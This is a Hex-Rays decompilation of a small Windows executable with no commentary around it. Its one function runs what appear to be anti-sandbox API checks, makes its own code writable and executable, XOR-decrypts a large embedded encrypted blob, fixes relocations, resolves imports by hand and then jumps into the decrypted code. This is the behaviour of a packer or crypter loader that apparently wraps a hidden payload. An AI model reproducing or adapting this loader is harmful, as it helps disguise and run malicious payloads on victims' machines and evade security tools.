/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// DWORD __usercall start@<eax>(int@<ebp>, int@<edi>);

//-------------------------------------------------------------------------
// Data declarations

char byte_401677[] = { '\0' }; // weak
char byte_401678[] = { 'P' }; // weak
char byte_401679[] = { 'P' }; // weak
char byte_40167A[] = { '‹' }; // weak
char byte_40167B[] = { '—' }; // weak
char byte_40167C[] = { 'Ø' }; // weak
char byte_40167D[] = { 'C' }; // weak
int dword_401E58[512] =
{
  -335273765,
  -1220551458,
  -1816247117,
  -602701923,
  -1175510385,
  -533849958,
  1206664054,
  -607309875,
  -1664898349,
  -1879964907,
  -1626019000,
  1720336142,
  -850754478,
  -1797365671,
  396202942,
  479873299,
  445305824,
  1400277802,
  1071440620,
  1343533495,
  320786822,
  340321702,
  779747014,
  274660762,
  741330267,
  -1345216725,
  -433827578,
  -746387227,
  -1993444694,
  466748296,
  -790156750,
  -1038565612,
  -1411211707,
  -1890010816,
  1720336358,
  -1625632254,
  525578944,
  -1926462545,
  547337730,
  1654309211,
  -478982786,
  954026646,
  1343543975,
  320793990,
  1933903014,
  1180867266,
  -1806474182,
  -818279909,
  1941902536,
  1224938884,
  -740242278,
  305920394,
  412373863,
  -801691086,
  -1093877996,
  1290751445,
  -1697389264,
  1988763896,
  -850752823,
  349940125,
  361602335,
  1217378477,
  1922751803,
  1400276168,
  1070417016,
  -1357589321,
  320176823,
  -347570042,
  779261421,
  -2074904110,
  -1488993748,
  -1817240657,
  -1240262133,
  -739555555,
  -1976664772,
  1250188490,
  -609800187,
  -1919704884,
  -1883890435,
  -1697389378,
  1988771440,
  -850750399,
  349939519,
  361595737,
  1217377811,
  1922745287,
  1400277550,
  1070422760,
  -1357591769,
  320183755,
  -347562224,
  779258473,
  -2074909092,
  -1488986866,
  -1817246645,
  -1240263283,
  -1750594866,
  -1033292577,
  114235711,
  -1947700864,
  -641663675,
  -673102528,
  -122506991,
  284117521,
  -1490817996,
  2058799956,
  1744626624,
  1056621152,
  149138332,
  1615117086,
  150699952,
  -2143296865,
  320179603,
  -2128091939,
  1560343993,
  -264890204,
  -1488990902,
  -1518263838,
  -1742062663,
  -739541570,
  -480504852,
  636501271,
  -1262218821,
  -1919701127,
  -472293023,
  -491338374,
  1988767255,
  -1591347673,
  1906557457,
  361599919,
  603767651,
  400733893,
  1400277550,
  1070418564,
  -965823254,
  1014292991,
  -881286782,
  1126038011,
  -316205062,
  -1671782104,
  -620996101,
  -1742391864,
  -204461377,
  -297788467,
  1794581529,
  -293115005,
  -1381458118,
  -604807877,
  -929060760,
  1185161042,
  -59525507,
  349933067,
  1710876615,
  1839241513,
  1576860824,
  990291017,
  1070418676,
  -832521533,
  320179630,
  -1738020455,
  1578822397,
  -2074904950,
  -210992614,
  -1817242405,
  -1031963954,
  -23124246,
  -279049266,
  988115788,
  -1194437699,
  -486876299,
  -1563542405,
  -1213948865,
  469254420,
  -1590103682,
  2075707738,
  367654603,
  415429447,
  1922749419,
  1400277618,
  1369979627,
  -1357587545,
  1667365371,
  -832069492,
  1566029216,
  -2074904950,
  -833510339,
  -1109691979,
  -1233159703,
  -1081204484,
  -1541651978,
  1256734482,
  -1446884168,
  -373449433,
  -1883865223,
  -223306437,
  1493064989,
  -852493258,
  349940455,
  361599919,
  1217377811,
  1922745333,
  1400275310,
  1070417096,
  -1357587545,
  320179603,
  -347562098,
  779260263,
  -2074904354,
  -1488990902,
  -1817242405,
  -1240267417,
  -739556557,
  -1976664866,
  1250186102,
  -609796147,
  -1919697390,
  -1883891527,
  -1697387704,
  1988767346,
  -850754477,
  349939519,
  361599919,
  1217378411,
  1922751841,
  1400276148,
  1070416934,
  -1357589225,
  320176941,
  -347569818,
  779260981,
  -2074904458,
  -1488993702,
  -1817240577,
  -1240261955,
  -739555407,
  -1976664638,
  1250188304,
  -609800007,
  -1919704942,
  -1883890553,
  -1697389330,
  1988764110,
  -850752613,
  349939943,
  361602119,
  1217378789,
  1922745321,
  1400281660,
  1070418564,
  -1357591727,
  320179603,
  -347562086,
  779262675,
  -2074908954,
  -1488986678,
  -1817246589,
  -1240267477,
  -739551179,
  -1976671668,
  1250181938,
  -609800355,
  -1919701228,
  -421523305,
  -72966342,
  451309342,
  -1257248964,
  378119999,
  1911356643,
  988667743,
  870556042,
  1344309806,
  1520969431,
  -1344152617,
  1987117013,
  -1742282507,
  773322428,
  -65636813,
  -714098397,
  -523601996,
  -1233840642,
  -1299301684,
  -125954066,
  971059225,
  -609780034,
  -322655100,
  -521115780,
  -189089734,
  971981333,
  -1372590543,
  363243339,
  1492776680,
  620417660,
  519280014,
  1041744971,
  1070402529,
  -900474256,
  1635637735,
  -1473450285,
  1258747068,
  -2074934542,
  -1032270795,
  -138389073,
  -25789960,
  -1081137426,
  -1976683521,
  971526347,
  -1161540167,
  -1919685024,
  -34270394,
  -5797331,
  333858612,
  -871201774,
  1370473080,
  1743054273,
  769841276,
  332179333,
  823649116,
  1066151912,
  -968697820,
  1918958049,
  -1908749862,
  776379062,
  -147055927,
  -916552401,
  -1815447361,
  -749464531,
  -1130817285,
  -297126919,
  972502532,
  -637845555,
  -319766440,
  -356231815,
  -1718359251,
  587090721,
  -1406142917,
  2058675291,
  1643509467,
  1260566035,
  116629948,
  1006950987,
  1287532519,
  -1065763094,
  320206049,
  -1725985774,
  1746398906,
  -2076828957,
  -1032990824,
  -155033176,
  -748585511,
  -739562258,
  -478645989,
  737224452,
  -1211400543,
  -1919693701,
  -353234026,
  -5796316,
  333858612,
  -830045166,
  1722799187,
  1424225987,
  1222686227,
  335520168,
  992145242,
  1538011126,
  -1395467353,
  1633812223,
  -1439563819,
  1798937299,
  -938067752,
  -1022230663,
  -1817216841,
  -983296166,
  -1115538689,
  -1972431634,
  415301667,
  -1081537026,
  -1919696008,
  -503377018,
  -190738884,
  113596951,
  -1088427466,
  349955667,
  2076480448,
  654168935,
  500803470,
  806609984,
  1070402544,
  -614671362,
  1984364007,
  -1910838312,
  1561849762,
  -2074920962,
  -914960936,
  -35819089,
  -967024152,
  -743823638,
  -462982413,
  620115458,
  -1209775192,
  -973677445,
  -472744588,
  -1702434003,
  117332538,
  -1557138404,
  1638580845,
  1425662154,
  1208989203,
  401522082,
  655615068,
  2092511171,
  -897927736,
  2003892720,
  -1624638491,
  786995894,
  -517531453,
  -749034696,
  -137465463,
  -746619701,
  -1698936689,
  -815776812,
  652246306,
  -627032159,
  -503920825,
  -355576199,
  -5792213,
  1054420531,
  -33109994,
  2025818381,
  361599939,
  1217377811,
  1922749419,
  1400277550,
  801982188,
  -1089153029,
  51741123,
  -79133706,
  1047697127,
  -1806468418,
  -1220558482,
  -2085675205,
  -1240263283,
  -739555185,
  -1976667494,
  1250186102,
  -609796147,
  -1919701228,
  -1883892971,
  -1697387704,
  1988767346,
  -850754477,
  349939519,
  361599919,
  1217377811,
  1922749419,
  1400277550,
  1070418564,
  -1357587545,
  320179603,
  -347566154,
  779262675,
  -2074904950,
  -1488990902,
  -1817242405,
  -1240263283,
  -739555185,
  -1976667494,
  1250186102,
  -609796147,
  -1919701228,
  -1883892971,
  -1697387704,
  1988767346,
  -850754477,
  349939519,
  361599919,
  1217377811,
  1922749419,
  1400277550,
  1070418564,
  -1357587545,
  320179603,
  -347566154,
  779262675,
  -2074904950,
  -1488990902,
  -1817242405,
  -1240263283,
  -739555185,
  -1976667494,
  1250186102,
  -609796147,
  -1919701228,
  -1883892971,
  -1697387704,
  1988767346,
  -850754477,
  349939519,
  361599919,
  1217377811,
  1922749419,
  1400277550,
  1070418564,
  -1357587545,
  320179603,
  -347566154,
  779262675,
  -2074904950,
  -1488990902,
  -1817242405,
  -1240263283,
  -739555185,
  -1976667494
}; // weak
int dword_402978[162] =
{
  779262675,
  -2074904998,
  -1778843680,
  -1588517327,
  -2058279254,
  -527139880,
  -1174519541,
  2035900576,
  -397013973,
  -1180591332,
  -1150408869,
  -1395990880,
  1089935383,
  -73157932,
  573346255,
  579904703,
  2142863664,
  1171252438,
  1679277428,
  146046440,
  -1731924953,
  619887218,
  -750340019,
  372417257,
  -1139257652,
  -1623067342,
  -1421726716,
  -1893913227,
  -356290151,
  -1285796927,
  1929538057,
  -503118270,
  -1269524822,
  -1235473679,
  -1557409095,
  1284248690,
  -145703329,
  786865420,
  802728418,
  1927711863,
  1209592209,
  1776398498,
  90468379,
  -1783766762,
  701478700,
  -776293026,
  344891428,
  -1084338807,
  -1675102631,
  -1467207740,
  -1925435740,
  -739544135,
  -1976671590,
  1250186094,
  -360509715,
  -1128292804,
  -1098767835,
  -1410344336,
  1988767346,
  -850754477,
  349939519,
  361599919,
  1217377811,
  1922749419,
  1400277550,
  1070418564,
  -1357587545,
  320179603,
  -347566154,
  779262675,
  -2074904950,
  -1488990902,
  -1817242405,
  -1240263283,
  -739555185,
  -1976667494,
  1250186102,
  -609796147,
  -1919701228,
  -1883892971,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
// extern BOOL (__stdcall *AreAllAccessesGranted)(DWORD GrantedAccess, DWORD DesiredAccess);
// extern DWORD (__stdcall *AddUsersToEncryptedFile)(LPCWSTR lpFileName, PENCRYPTION_CERTIFICATE_LIST pEncryptionCertificates);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern PSTR (__stdcall *StrStrIA)(PCSTR pszFirst, PCSTR pszSrch);
char byte_404000[512] =
{
  'q',
  '¾',
  '\x05',
  '9',
  '\'',
  '¿',
  '¹',
  '\x1C',
  '%',
  'â',
  'A',
  'y',
  '0',
  'Ø',
  '„',
  ' ',
  'Ü',
  'ù',
  '.',
  'à',
  'g',
  '•',
  '\r',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak


//----- (00401000) --------------------------------------------------------
DWORD __usercall start@<eax>(int a1@<ebp>, int a2@<edi>)
{
  int v2; // esi
  int v3; // ebx
  DWORD result; // eax
  unsigned int v5; // eax
  char v6; // cl
  int v7; // esi
  char v8; // dl
  int v9; // esi
  char v10; // cl
  int v11; // esi
  char v12; // dl
  int v13; // esi
  char v14; // cl
  int v15; // esi
  char v16; // dl
  char *v17; // edi
  int *v18; // ecx
  _WORD *v19; // edx
  unsigned int v20; // ebx
  int v21; // eax
  bool v22; // zf
  char *v23; // ebx
  HMODULE LibraryA; // ecx
  int v25; // ebp
  int v26; // eax
  char *v27; // ebp
  FARPROC *v28; // esi
  FARPROC ProcAddress; // eax
  DWORD flOldProtect; // [esp+Ch] [ebp-10h] BYREF
  char *i; // [esp+10h] [ebp-Ch]
  char *v34; // [esp+14h] [ebp-8h]
  HMODULE v35; // [esp+18h] [ebp-4h]

  v2 = 0;
  v3 = 23;
  if ( StrStrIA("StrStrIA", 0) )
    return 0;
  result = AddUsersToEncryptedFile(0, 0);
  if ( result )
  {
    if ( !AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
      v3 = 25;
    VirtualProtect(start, 0x3000u, 0x40u, &flOldProtect);
    v5 = 0;
    while ( 1 )
    {
      if ( v2 == v3 )
        v2 = 0;
      v6 = byte_401678[v5] ^ byte_404000[v2];
      v7 = v2 + 1;
      byte_401678[v5] = v6 ^ 0xAA;
      if ( v7 == v3 )
        v7 = 0;
      v8 = byte_401679[v5] ^ byte_404000[v7];
      v9 = v7 + 1;
      byte_401679[v5] = v8 ^ 0xAA;
      if ( v9 == v3 )
        v9 = 0;
      v10 = byte_40167A[v5] ^ byte_404000[v9];
      v11 = v9 + 1;
      byte_40167A[v5] = v10 ^ 0xAA;
      if ( v11 == v3 )
        v11 = 0;
      v12 = byte_40167B[v5] ^ byte_404000[v11];
      v13 = v11 + 1;
      byte_40167B[v5] = v12 ^ 0xAA;
      if ( v13 == v3 )
        v13 = 0;
      v14 = byte_40167C[v5] ^ byte_404000[v13];
      v15 = v13 + 1;
      byte_40167C[v5] = v14 ^ 0xAA;
      if ( v15 == v3 )
        v15 = 0;
      v16 = byte_40167D[v5] ^ byte_404000[v15];
      v5 += 6;
      byte_401677[v5] = v16 ^ 0xAA;
      v2 = v15 + 1;
      if ( v5 >= 0x1440 )
      {
        v17 = &byte_401678[-640];
        v18 = dword_402978;
        v34 = &byte_401678[-640];
        i = 0;
        while ( 1 )
        {
          v19 = v18 + 2;
          if ( (unsigned int)(v18[1] - 8) >> 1 )
          {
            v20 = (unsigned int)(v18[1] - 8) >> 1;
            do
            {
              if ( (*v19 & 0xF000) == 12288 )
                *(_DWORD *)&v17[*v18 + (*v19 & 0xFFF)] += &byte_401678[-268436096];
              ++v19;
              --v20;
            }
            while ( v20 );
          }
          v21 = v18[1];
          v18 = (int *)((char *)v18 + v21);
          i += v21;
          if ( (unsigned int)i >= 0xE8 )
          {
            v22 = *(_DWORD *)&byte_401678[2820] == 0;
            v23 = &byte_401678[2804];
            for ( i = &byte_401678[2804]; !v22; i = v23 )
            {
              LibraryA = LoadLibraryA(&v17[*((_DWORD *)v23 + 3)]);
              v35 = LibraryA;
              if ( LibraryA )
              {
                v25 = *(_DWORD *)v23;
                if ( !*(_DWORD *)v23 )
                  v25 = *((_DWORD *)v23 + 4);
                v26 = *(_DWORD *)&v17[v25];
                v27 = &v17[v25];
                v28 = (FARPROC *)&v17[*((_DWORD *)v23 + 4)];
                if ( v26 )
                {
                  while ( 1 )
                  {
                    if ( v26 >= 0 )
                    {
                      ProcAddress = GetProcAddress(LibraryA, &v17[v26 + 2]);
                    }
                    else
                    {
                      ProcAddress = GetProcAddress(LibraryA, (LPCSTR)*(unsigned __int16 *)v27);
                      v23 = (char *)v28 + (_DWORD)v23;
                    }
                    *v28 = ProcAddress;
                    v27 += 4;
                    v26 = *(_DWORD *)v27;
                    v17 = v34;
                    ++v28;
                    if ( !*(_DWORD *)v27 )
                      break;
                    LibraryA = v35;
                  }
                  v23 = i;
                }
              }
              v23 += 20;
              v22 = *((_DWORD *)v23 + 4) == 0;
            }
            ((void (__cdecl *)(int, int))dword_401E58[0])(a2, a1);
            ExitProcess(0);
          }
        }
      }
    }
  }
  return result;
}
// 401E58: using guessed type int dword_401E58[512];
// 402978: using guessed type int dword_402978[162];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
